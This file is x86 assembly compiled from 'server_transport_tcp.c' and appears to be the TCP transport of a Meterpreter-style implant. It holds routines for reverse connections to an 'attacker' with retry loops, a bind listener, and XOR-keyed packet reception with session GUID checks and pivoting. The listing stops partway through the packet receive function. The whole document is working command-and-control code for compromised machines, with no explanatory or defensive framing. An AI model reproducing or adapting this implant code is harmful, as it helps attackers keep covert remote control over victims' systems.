	.file	"server_transport_tcp.c"
	.text
	.section .rdata,"dr"
LC0:
	.ascii "[%04x] \0"
LC1:
	.ascii "\15\12\0"
	.text
	.def	_real_dprintf;	.scl	3;	.type	32;	.endef
_real_dprintf:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%esi
	pushl	%ebx
	subl	$1072, %esp
	movl	__imp__GetCurrentThreadId@0, %eax
	call	*%eax
	movl	%eax, 16(%esp)
	movl	$LC0, 12(%esp)
	movl	$1023, 8(%esp)
	movl	$1024, 4(%esp)
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___snprintf_s, %eax
	call	*%eax
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	call	_strlen
	movl	%eax, -12(%ebp)
	leal	12(%ebp), %eax
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %ecx
	movl	$1021, %eax
	subl	-12(%ebp), %eax
	movl	%eax, %edx
	movl	$1024, %eax
	subl	-12(%ebp), %eax
	leal	-1040(%ebp), %esi
	movl	-12(%ebp), %ebx
	addl	%esi, %ebx
	movl	%ecx, 16(%esp)
	movl	8(%ebp), %ecx
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%ebx, (%esp)
	call	_vsnprintf_s
	movl	$LC1, 8(%esp)
	movl	$1024, 4(%esp)
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__strcat_s, %eax
	call	*%eax
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__OutputDebugStringA@4, %eax
	call	*%eax
	subl	$4, %esp
	nop
	leal	-8(%ebp), %esp
	popl	%ebx
	popl	%esi
	popl	%ebp
	ret
	.section .rdata,"dr"
	.align 4
LC2:
	.ascii "[TCP RUN] Connection failed, sleeping for %u s\0"
	.text
	.def	_reverse_tcp_run;	.scl	3;	.type	32;	.endef
_reverse_tcp_run:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	call	_current_unix_timestamp
	movl	%eax, -16(%ebp)
L5:
	call	_current_unix_timestamp
	movl	%eax, -20(%ebp)
	movl	16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__connect@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -12(%ebp)
	cmpl	$-1, -12(%ebp)
	jne	L8
	movl	24(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC2, (%esp)
	call	_real_dprintf
	movl	24(%ebp), %eax
	movl	%eax, (%esp)
	call	_sleep
	call	_current_unix_timestamp
	movl	%eax, %edx
	movl	-16(%ebp), %eax
	subl	%eax, %edx
	movl	%edx, %eax
	cmpl	%eax, 20(%ebp)
	ja	L5
	jmp	L4
L8:
	nop
L4:
	cmpl	$-1, -12(%ebp)
	jne	L6
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__closesocket@4, %eax
	call	*%eax
	subl	$4, %esp
L6:
	movl	-12(%ebp), %eax
	leave
	ret
	.def	_reverse_tcp4;	.scl	3;	.type	32;	.endef
_reverse_tcp4:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	subl	$484, %esp
	movl	12(%ebp), %eax
	movw	%ax, -444(%ebp)
	movl	24(%ebp), %eax
	movl	$0, (%eax)
	leal	-424(%ebp), %edx
	movl	$0, %eax
	movl	$100, %ecx
	movl	%edx, %edi
	rep stosl
	leal	-424(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$514, (%esp)
	movl	__imp__WSAStartup@8, %eax
	call	*%eax
	subl	$8, %esp
	testl	%eax, %eax
	je	L10
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	jmp	L13
L10:
	movl	$6, 8(%esp)
	movl	$1, 4(%esp)
	movl	$2, (%esp)
	movl	__imp__socket@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -12(%ebp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__gethostbyname@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %eax
	movl	12(%eax), %eax
	movl	(%eax), %eax
	movl	(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__inet_ntoa@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, -20(%ebp)
	movl	$0, -440(%ebp)
	movl	$0, -436(%ebp)
	movl	$0, -432(%ebp)
	movl	$0, -428(%ebp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__inet_addr@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, -436(%ebp)
	movw	$2, -440(%ebp)
	movzwl	-444(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__htons@4, %eax
	call	*%eax
	subl	$4, %esp
	movw	%ax, -438(%ebp)
	movl	20(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	$16, 8(%esp)
	leal	-440(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_reverse_tcp_run
	movl	%eax, -24(%ebp)
	cmpl	$0, -24(%ebp)
	jne	L12
	movl	24(%ebp), %eax
	movl	-12(%ebp), %edx
	movl	%edx, (%eax)
L12:
	movl	-24(%ebp), %eax
L13:
	movl	-4(%ebp), %edi
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC3:
	.ascii "[STAGELESS IPV6] failed to connect to attacker\0"
	.align 4
LC4:
	.ascii "[STAGELESS IPV6] Socket successfully connected\0"
	.text
	.def	_reverse_tcp6;	.scl	3;	.type	32;	.endef
_reverse_tcp6:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	subl	$484, %esp
	movl	28(%ebp), %eax
	movl	$0, (%eax)
	leal	-428(%ebp), %edx
	movl	$0, %eax
	movl	$100, %ecx
	movl	%edx, %edi
	rep stosl
	leal	-428(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$514, (%esp)
	movl	__imp__WSAStartup@8, %eax
	call	*%eax
	subl	$8, %esp
	testl	%eax, %eax
	je	L15
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	jmp	L25
L15:
	movl	$0, %ecx
	movl	$32, %eax
	andl	$-4, %eax
	movl	%eax, %edx
	movl	$0, %eax
L17:
	movl	%ecx, -460(%ebp,%eax)
	addl	$4, %eax
	cmpl	%edx, %eax
	jb	L17
	movl	$23, -456(%ebp)
	movl	$1, -452(%ebp)
	movl	$6, -448(%ebp)
	leal	-464(%ebp), %eax
	movl	%eax, 12(%esp)
	leal	-460(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__getaddrinfo@16, %eax
	call	*%eax
	subl	$16, %esp
	testl	%eax, %eax
	je	L19
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	jmp	L25
L19:
	movl	$6, 8(%esp)
	movl	$1, 4(%esp)
	movl	$23, (%esp)
	movl	__imp__socket@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -20(%ebp)
	cmpl	$-1, -20(%ebp)
	jne	L20
	movl	$LC3, (%esp)
	call	_real_dprintf
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	jmp	L25
L20:
	movl	$0, -12(%ebp)
	call	_current_unix_timestamp
	movl	%eax, -24(%ebp)
L24:
	call	_current_unix_timestamp
	movl	%eax, -28(%ebp)
	movl	-464(%ebp), %eax
	movl	%eax, -16(%ebp)
	jmp	L21
L23:
	movl	-16(%ebp), %eax
	movl	24(%eax), %eax
	movl	16(%ebp), %edx
	movl	%edx, 24(%eax)
	movl	-16(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, %edx
	movl	-16(%ebp), %eax
	movl	24(%eax), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__connect@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -12(%ebp)
	cmpl	$-1, -12(%ebp)
	je	L22
	movl	$LC4, (%esp)
	call	_real_dprintf
	movl	28(%ebp), %eax
	movl	-20(%ebp), %edx
	movl	%edx, (%eax)
	movl	-464(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__freeaddrinfo@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	$0, %eax
	jmp	L25
L22:
	movl	-16(%ebp), %eax
	movl	28(%eax), %eax
	movl	%eax, -16(%ebp)
L21:
	cmpl	$0, -16(%ebp)
	jne	L23
	movl	24(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC2, (%esp)
	call	_real_dprintf
	movl	24(%ebp), %eax
	movl	%eax, (%esp)
	call	_sleep
	call	_current_unix_timestamp
	movl	%eax, %edx
	movl	-24(%ebp), %eax
	subl	%eax, %edx
	movl	%edx, %eax
	cmpl	%eax, 20(%ebp)
	ja	L24
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__closesocket@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	-464(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__freeaddrinfo@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	-12(%ebp), %eax
L25:
	movl	-4(%ebp), %edi
	leave
	ret
	.def	_bind_tcp_run;	.scl	3;	.type	32;	.endef
_bind_tcp_run:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	movl	16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__bind@12, %eax
	call	*%eax
	subl	$12, %esp
	cmpl	$-1, %eax
	jne	L27
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L28
L27:
	movl	$1, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__listen@8, %eax
	call	*%eax
	subl	$8, %esp
	cmpl	$-1, %eax
	jne	L29
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L28
L29:
	movl	$0, 8(%esp)
	movl	$0, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__accept@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -16(%ebp)
	cmpl	$-1, -16(%ebp)
	jne	L30
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L28
L30:
	movl	20(%ebp), %eax
	movl	-16(%ebp), %edx
	movl	%edx, (%eax)
L28:
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__closesocket@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	-12(%ebp), %eax
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC5:
	.ascii "[BIND] Unable to create IPv6 socket\0"
	.align 4
LC6:
	.ascii "[BIND] Unable to remove IPV6_ONLY option\0"
LC7:
	.ascii "[BIND] Falling back to IPV4\0"
	.text
	.def	_bind_tcp;	.scl	3;	.type	32;	.endef
_bind_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	subl	$500, %esp
	movl	8(%ebp), %eax
	movw	%ax, -460(%ebp)
	movl	12(%ebp), %eax
	movl	$0, (%eax)
	leal	-420(%ebp), %edx
	movl	$0, %eax
	movl	$100, %ecx
	movl	%edx, %edi
	rep stosl
	leal	-420(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$514, (%esp)
	movl	__imp__WSAStartup@8, %eax
	call	*%eax
	subl	$8, %esp
	testl	%eax, %eax
	je	L33
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	jmp	L45
L33:
	movl	$0, -12(%ebp)
	movl	$6, 8(%esp)
	movl	$1, 4(%esp)
	movl	$23, (%esp)
	movl	__imp__socket@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -16(%ebp)
	cmpl	$-1, -16(%ebp)
	jne	L35
	movl	$LC5, (%esp)
	call	_real_dprintf
	movl	$1, -12(%ebp)
	jmp	L36
L35:
	movl	$0, -452(%ebp)
	movl	$4, 16(%esp)
	leal	-452(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	$27, 8(%esp)
	movl	$41, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__setsockopt@20, %eax
	call	*%eax
	subl	$20, %esp
	cmpl	$-1, %eax
	jne	L36
	movl	$LC6, (%esp)
	call	_real_dprintf
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__closesocket@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	$1, -12(%ebp)
L36:
	cmpl	$0, -12(%ebp)
	je	L38
	movl	$LC7, (%esp)
	call	_real_dprintf
	movl	$6, 8(%esp)
	movl	$1, 4(%esp)
	movl	$2, (%esp)
	movl	__imp__socket@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -16(%ebp)
L38:
	movl	$0, %ecx
	movl	$28, %eax
	andl	$-4, %eax
	movl	%eax, %edx
	movl	$0, %eax
L39:
	movl	%ecx, -448(%ebp,%eax)
	addl	$4, %eax
	cmpl	%edx, %eax
	jb	L39
	cmpl	$0, -12(%ebp)
	je	L41
	leal	-448(%ebp), %eax
	movl	%eax, -20(%ebp)
	movl	$0, (%esp)
	movl	__imp__htons@4, %eax
	call	*%eax
	subl	$4, %esp
	movzwl	%ax, %edx
	movl	-20(%ebp), %eax
	movl	%edx, 4(%eax)
	movl	-20(%ebp), %eax
	movw	$2, (%eax)
	movzwl	-460(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__htons@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	-20(%ebp), %edx
	movw	%ax, 2(%edx)
	jmp	L42
L41:
	movl	_in6addr_any, %eax
	movl	%eax, -440(%ebp)
	movl	_in6addr_any+4, %eax
	movl	%eax, -436(%ebp)
	movl	_in6addr_any+8, %eax
	movl	%eax, -432(%ebp)
	movl	_in6addr_any+12, %eax
	movl	%eax, -428(%ebp)
	movw	$23, -448(%ebp)
	movzwl	-460(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__htons@4, %eax
	call	*%eax
	subl	$4, %esp
	movw	%ax, -446(%ebp)
L42:
	cmpl	$0, -12(%ebp)
	je	L43
	movl	$16, %edx
	jmp	L44
L43:
	movl	$28, %edx
L44:
	movl	12(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	%edx, 8(%esp)
	leal	-448(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_bind_tcp_run
L45:
	movl	-4(%ebp), %edi
	leave
	ret
	.def	_server_socket_poll;	.scl	3;	.type	32;	.endef
_server_socket_poll:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$328, %esp
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	48(%eax), %eax
	movl	%eax, -16(%ebp)
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	movl	$0, -288(%ebp)
	movl	$0, -12(%ebp)
	jmp	L47
L50:
	movl	-12(%ebp), %eax
	movl	-284(%ebp,%eax,4), %edx
	movl	-16(%ebp), %eax
	movl	(%eax), %eax
	cmpl	%eax, %edx
	je	L53
	addl	$1, -12(%ebp)
L47:
	movl	-288(%ebp), %eax
	cmpl	%eax, -12(%ebp)
	jb	L50
	jmp	L49
L53:
	nop
L49:
	movl	-288(%ebp), %eax
	cmpl	%eax, -12(%ebp)
	jne	L51
	movl	-288(%ebp), %eax
	cmpl	$63, %eax
	ja	L51
	movl	-16(%ebp), %eax
	movl	(%eax), %edx
	movl	-12(%ebp), %eax
	movl	%edx, -284(%ebp,%eax,4)
	movl	-288(%ebp), %eax
	addl	$1, %eax
	movl	%eax, -288(%ebp)
L51:
	movl	$0, -28(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, -24(%ebp)
	movl	-16(%ebp), %eax
	movl	(%eax), %eax
	leal	1(%eax), %edx
	leal	-28(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	$0, 12(%esp)
	movl	$0, 8(%esp)
	leal	-288(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	movl	__imp__select@20, %eax
	call	*%eax
	subl	$20, %esp
	movl	%eax, -20(%ebp)
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
	movl	-20(%ebp), %eax
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC8:
	.ascii "[TCP PACKET RECEIVE] reading in the header\0"
	.align 4
LC9:
	.ascii "[TCP] we didn't get enough header bytes\0"
	.align 4
LC10:
	.ascii "[TCP] the XOR key is: %02x%02x%02x%02x\0"
	.align 4
LC11:
	.ascii "[TCP] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]\0"
	.align 4
LC12:
	.ascii "[TCP] discovered a length header, assuming it's metsrv of length %d\0"
	.align 4
LC13:
	.ascii "[TCP] XOR key looks fine, moving on\0"
LC14:
	.ascii "[TCP] Payload length is %d\0"
	.align 4
LC15:
	.ascii "[TCP] total buffer size for the packet is %d\0"
	.align 4
LC16:
	.ascii "[TCP] Failed to create the packet buffer\0"
	.align 4
LC17:
	.ascii "[TCP] Allocated packet buffer at %p\0"
	.align 4
LC18:
	.ascii "[TCP] Failed to get all the payload bytes\0"
	.align 4
LC19:
	.ascii "[TCP] Packet Session GUID: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\0"
	.align 4
LC20:
	.ascii "[TCP] Session GUIDs match (or packet guid is null), decrypting packet\0"
	.align 4
LC21:
	.ascii "[TCP] Session GUIDs don't match, looking for a pivot\0"
	.align 4
LC22:
	.ascii "[TCP] Pivot found, dispatching packet on a thread (to avoid main thread blocking)\0"
	.align 4
LC23:
	.ascii "[TCP] Session GUIDs don't match, can't find pivot!\0"
LC24:
	.ascii "[TCP] Freeing stuff up\0"
LC25:
	.ascii "[TCP] Packet receive finished\0"
	.text
	.def	_packet_receive;	.scl	3;	.type	32;	.endef
_packet_receive:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	movl	$65916, %eax
	call	___chkstk_ms
	subl	%eax, %esp
	movl	$0, -28(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -48(%ebp)
	movl	$0, %ecx
	movl	$32, %eax
	andl	$-4, %eax
	movl	%eax, %edx
	movl	$0, %eax
L55:
	movl	%ecx, -124(%ebp,%eax)
	addl	$4, %eax
	cmpl	%edx, %eax
	jb	L55
	movl	$1, -36(%ebp)
	movl	$0, -40(%ebp)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	48(%eax), %eax
	movl	%eax, -52(%ebp)
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	movl	$LC8, (%esp)
	call	_real_dprintf
	jmp	L57
L61:
	movl	$32, %eax
	subl	-28(%ebp), %eax
	movl	%eax, %ecx
	leal	-124(%ebp), %edx
	movl	-28(%ebp), %eax
	addl	%eax, %edx
	movl	-52(%ebp), %eax
	movl	(%eax), %eax
	movl	$0, 12(%esp)
	movl	%ecx, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__recv@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -80(%ebp)
	cmpl	$0, -80(%ebp)
	jg	L58
	movl	$1168, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L59
L58:
	movl	-80(%ebp), %eax
	addl	%eax, -28(%ebp)
	cmpl	$32, -28(%ebp)
	je	L60
	jmp	L57
L60:
	movl	$0, -36(%ebp)
L57:
	cmpl	$0, -36(%ebp)
	jne	L61
	cmpl	$32, -28(%ebp)
	je	L62
	movl	$LC9, (%esp)
	call	_real_dprintf
	jmp	L59
L62:
	movzbl	-121(%ebp), %eax
	movzbl	%al, %ebx
	movzbl	-122(%ebp), %eax
	movzbl	%al, %ecx
	movzbl	-123(%ebp), %eax
	movzbl	%al, %edx
	movzbl	-124(%ebp), %eax
	movzbl	%al, %eax
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC10, (%esp)
	call	_real_dprintf
	leal	-124(%ebp), %eax
	movl	%eax, -56(%ebp)
	movl	-56(%ebp), %eax
	addl	$31, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, %edx
	movl	-56(%ebp), %eax
	addl	$30, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -65676(%ebp)
	movl	-56(%ebp), %eax
	addl	$29, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -65680(%ebp)
	movl	-56(%ebp), %eax
	addl	$28, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -65684(%ebp)
	movl	-56(%ebp), %eax
	addl	$27, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -65688(%ebp)
	movl	-56(%ebp), %eax
	addl	$26, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -65692(%ebp)
	movl	-56(%ebp), %eax
	addl	$25, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -65696(%ebp)
	movl	-56(%ebp), %eax
	addl	$24, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -65700(%ebp)
	movl	-56(%ebp), %eax
	addl	$23, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -65704(%ebp)
	movl	-56(%ebp), %eax
	addl	$22, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -65708(%ebp)
	movl	-56(%ebp), %eax
	addl	$21, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -65712(%ebp)
	movl	-56(%ebp), %eax
	addl	$20, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -65716(%ebp)
	movl	-56(%ebp), %eax
	addl	$19, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -65720(%ebp)
	movl	-56(%ebp), %eax
	addl	$18, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -65724(%ebp)
	movl	-56(%ebp), %eax
	addl	$17, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -65728(%ebp)
	movl	-56(%ebp), %eax
	addl	$16, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -65732(%ebp)
	movl	-56(%ebp), %eax
	addl	$15, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -65736(%ebp)
	movl	-56(%ebp), %eax
	addl	$14, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -65740(%ebp)
	movl	-56(%ebp), %eax
	addl	$13, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -65744(%ebp)
	movl	-56(%ebp), %eax
	addl	$12, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -65748(%ebp)
	movl	-56(%ebp), %eax
	addl	$11, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -65752(%ebp)
	movl	-56(%ebp), %eax
	addl	$10, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -65756(%ebp)
	movl	-56(%ebp), %eax
	addl	$9, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -65760(%ebp)
	movl	-56(%ebp), %eax
	addl	$8, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -65764(%ebp)
	movl	-56(%ebp), %eax
	addl	$7, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -65768(%ebp)
	movl	-56(%ebp), %eax
	addl	$6, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -65772(%ebp)
	movl	-56(%ebp), %eax
	addl	$5, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	-56(%ebp), %eax
	addl	$4, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	-56(%ebp), %eax
	addl	$3, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	-56(%ebp), %eax
	addl	$2, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	-56(%ebp), %eax
	addl	$1, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -65776(%ebp)
	movl	-56(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%edx, 128(%esp)
	movl	-65676(%ebp), %edx
	movl	%edx, 124(%esp)
	movl	-65680(%ebp), %edx
	movl	%edx, 120(%esp)
	movl	-65684(%ebp), %edx
	movl	%edx, 116(%esp)
	movl	-65688(%ebp), %edx
	movl	%edx, 112(%esp)
	movl	-65692(%ebp), %edx
	movl	%edx, 108(%esp)
	movl	-65696(%ebp), %edx
	movl	%edx, 104(%esp)
	movl	-65700(%ebp), %edx
	movl	%edx, 100(%esp)
	movl	-65704(%ebp), %edx
	movl	%edx, 96(%esp)
	movl	-65708(%ebp), %edx
	movl	%edx, 92(%esp)
	movl	-65712(%ebp), %edx
	movl	%edx, 88(%esp)
	movl	-65716(%ebp), %edx
	movl	%edx, 84(%esp)
	movl	-65720(%ebp), %edx
	movl	%edx, 80(%esp)
	movl	-65724(%ebp), %edx
	movl	%edx, 76(%esp)
	movl	-65728(%ebp), %edx
	movl	%edx, 72(%esp)
	movl	-65732(%ebp), %edx
	movl	%edx, 68(%esp)
	movl	-65736(%ebp), %edx
	movl	%edx, 64(%esp)
	movl	-65740(%ebp), %edx
	movl	%edx, 60(%esp)
	movl	-65744(%ebp), %edx
	movl	%edx, 56(%esp)
	movl	-65748(%ebp), %edx
	movl	%edx, 52(%esp)
	movl	-65752(%ebp), %edx
	movl	%edx, 48(%esp)
	movl	-65756(%ebp), %edx
	movl	%edx, 44(%esp)
	movl	-65760(%ebp), %edx
	movl	%edx, 40(%esp)
	movl	-65764(%ebp), %edx
	movl	%edx, 36(%esp)
	movl	-65768(%ebp), %edx
	movl	%edx, 32(%esp)
	movl	-65772(%ebp), %edx
	movl	%edx, 28(%esp)
	movl	%edi, 24(%esp)
	movl	%esi, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	-65776(%ebp), %ebx
	movl	%ebx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC11, (%esp)
	call	_real_dprintf
	movzbl	-121(%ebp), %eax
	testb	%al, %al
	jne	L63
	leal	-124(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, -84(%ebp)
	movl	-84(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC12, (%esp)
	call	_real_dprintf
	movl	-84(%ebp), %eax
	subl	$28, %eax
	movl	%eax, -44(%ebp)
	jmp	L64
L68:
	movl	-44(%ebp), %eax
	movl	$65535, %edx
	cmpl	$65535, %eax
	cmova	%edx, %eax
	movl	%eax, %edx
	movl	-52(%ebp), %eax
	movl	(%eax), %eax
	movl	$0, 12(%esp)
	movl	%edx, 8(%esp)
	leal	-65660(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__recv@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -88(%ebp)
	cmpl	$0, -88(%ebp)
	jns	L65
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	cmpl	$10035, %eax
	jne	L66
	jmp	L64
L66:
	movl	$1168, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L67
L65:
	movl	-88(%ebp), %eax
	subl	%eax, -44(%ebp)
L64:
	cmpl	$0, -44(%ebp)
	jg	L68
L67:
	cmpl	$0, -44(%ebp)
	jg	L85
	movl	$0, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	12(%ebp), %eax
	movl	$0, (%eax)
	jmp	L59
L63:
	movl	$LC13, (%esp)
	call	_real_dprintf
	movl	-124(%ebp), %eax
	movl	%eax, -65660(%ebp)
	movl	-120(%ebp), %eax
	movl	%eax, -65656(%ebp)
	movl	-116(%ebp), %eax
	movl	%eax, -65652(%ebp)
	movl	-112(%ebp), %eax
	movl	%eax, -65648(%ebp)
	movl	-108(%ebp), %eax
	movl	%eax, -65644(%ebp)
	movl	-104(%ebp), %eax
	movl	%eax, -65640(%ebp)
	movl	-100(%ebp), %eax
	movl	%eax, -65636(%ebp)
	movl	-96(%ebp), %eax
	movl	%eax, -65632(%ebp)
	leal	-124(%ebp), %eax
	addl	$4, %eax
